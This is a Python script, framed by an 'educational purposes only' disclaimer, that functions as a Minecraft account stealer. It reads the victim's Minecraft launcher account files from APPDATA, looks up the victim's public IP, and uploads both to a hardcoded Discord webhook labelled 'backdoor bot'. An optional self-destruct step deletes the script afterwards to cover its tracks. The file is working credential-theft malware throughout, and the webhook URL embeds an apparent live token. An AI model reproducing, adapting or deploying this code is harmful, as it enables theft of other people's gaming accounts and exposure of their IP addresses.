# THIS IS FOR EDUCATIONAL PURPOSES ONLY!!!
# DO NOT USE THIS SCRIPT AGAINST SOMEONE THAT YOU DON'T HAVE PERMISION ON
# I WILL NOT BE RESPONSABLE FOR THE ACT OF YOURS

#  _                                                _
# |   __     __               _____          _____   |
# |  |      |  |     |\   |     |    |   |  |     |  |
# |  |__   |____|    | \  |     |    |   |  |_____|  |
# |  |    |      |   |  \ |     |    |   |  |        |
# |  |   |        |  |   \|     |    |___|  |        |
# |_                                                _|

import os
from discord_webhook import DiscordWebhook
from requests import get
import socket

# Change this to your choice
self_destruct = False

appdata = os.getenv('APPDATA')

TEMP_DIR = os.getenv('TEMP')

os.chdir(f"{appdata}\\.minecraft")

mojang_account = open("launcher_accounts.json", "rb").read()
mc_microsoft_account = open("launcher_accounts_microsoft_store.json", "rb").read()

os.chdir(TEMP_DIR)

with open("log1.json", "wb") as log1:
    log1.write(mojang_account)
    log1.closed

with open("log2.json", "wb") as log2:
    log2.write(mc_microsoft_account)
    log2.closed

# Change this to your webhook url
WEBHOOK_URL = "https://discord.com/api/webhooks/1044955611252670484/P-arUVuSpIlBuQK8IdbFLNKFHMpKoEEtHrJuQBsEEdGaUnbHmxkUNWYk-6usRmDz6PG4"

webhook = DiscordWebhook(url=WEBHOOK_URL, username="backdoor bot", content=f"Get logged EZZZZZ\nPunlib ip: {get('https://api.ipify.org').content.decode('utf8')}\n\n")

webhook.add_file(mojang_account, filename="launcher_accounts.json")
webhook.add_file(mc_microsoft_account, filename="launcher_accounts_microsoft_store.json")

response = webhook.execute()

if self_destruct == True:
    os.remove(__file__)
